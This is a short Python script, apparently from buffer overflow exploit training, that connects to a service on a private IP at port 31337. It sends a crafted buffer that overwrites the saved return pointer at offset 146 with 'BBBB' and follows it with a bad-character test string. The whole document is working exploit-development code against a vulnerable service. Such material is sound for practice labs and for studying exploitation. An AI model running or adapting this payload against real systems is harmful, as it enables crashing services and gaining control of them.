import socket

RHOST = "10.92.92.129"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

bad_char_test = ""

bad_chars = [0x00, 0x0A]

for i in range(0x00, 0xFF+1):
    if i not in bad_chars:
        bad_char_test += chr(i)


with open("bad_char_test_2.bin", "wb") as f:
    f.write(bad_char_test.encode())

buffer_total_len = 1024
offset_srp = 146

buffer = ""
buffer += "A" * (offset_srp - len(buffer))
buffer += "BBBB"
buffer += bad_char_test
buffer += "D" * (buffer_total_len - len(buffer))
buffer += "\n"

s.send(buffer.encode())